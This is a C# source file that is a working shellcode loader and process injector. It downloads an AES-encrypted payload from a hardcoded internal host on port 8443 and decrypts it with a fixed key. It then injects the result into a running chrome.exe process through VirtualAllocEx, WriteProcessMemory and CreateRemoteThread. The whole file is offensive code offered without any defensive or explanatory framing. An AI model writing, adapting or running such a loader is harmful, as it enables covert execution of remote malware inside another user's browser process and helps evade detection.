using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);

    public enum State
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000
    }

    public enum Protection
    {
        PAGE_EXECUTE_READWRITE = 0x40
    }
    public enum Process
    {
        PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
        PROCESS_CREATE_THREAD = 0x0002,
        PROCESS_QUERY_INFORMATION = 0x0400,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_READ = 0x0010,
        PROCESS_VM_WRITE = 0x0020
    }

    static async Task Main(string[] args)
    {
        var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;
        string url = "http://192.168.3.68:8443/downloaded.bin.enc";

        {
            // Download raw binary data.
            byte[] rawData;

            using (HttpClient client = new HttpClient())
            {
                rawData = client.GetByteArrayAsync(url)
                .GetAwaiter()
                .GetResult();
            }
            // Example 32-byte key and 16-byte IV (Must match the encryption source)
            byte[] aesKey = Encoding.ASCII.GetBytes("0123456789ABCDEFGHIJKLMNOPQRSTUV");
            byte[] aesIv = Encoding.ASCII.GetBytes("0123456789ABCDEF");
            Console.WriteLine($"Key: {aesKey.Length} bytes");
            Console.WriteLine($"IV:  {aesIv.Length} bytes");

            byte[] shellcode = DecryptPayload(rawData, aesKey, aesIv);


            int shellcode_size = shellcode.Length;
            int bytesWritten = 0;
            int lpthreadID = 0;
            System.Diagnostics.Process[] processes =
              System.Diagnostics.Process.GetProcessesByName("chrome");

            if (processes.Length == 0)
            {
                Console.WriteLine("chrome.exe was not found.");
                return;
            }

            System.Diagnostics.Process target = processes[0];

            Console.WriteLine($"Found chrome.exe, PID: {target.Id}");

            IntPtr procHandle = OpenProcess(
                (uint)desiredAccess,
                false,
                (uint)target.Id);

            if (procHandle == IntPtr.Zero)
            {
                Console.WriteLine(
                    $"OpenProcess failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            Console.WriteLine("OpenProcess succeeded.");
            //IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));
            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(procHandle, init, shellcode, shellcode_size, ref bytesWritten);
            Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);
            IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);
            Console.WriteLine("[*] Thread ID: {0}", lpthreadID);
        }
    }

    // Helper method to perform AES-256-CBC decryption
    private static byte[] DecryptPayload(byte[] cipherText, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msDecrypt = new MemoryStream(cipherText))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (MemoryStream msResult = new MemoryStream())
                    {
                        csDecrypt.CopyTo(msResult);
                        return msResult.ToArray();
                    }
                }
            }
        }
    }
}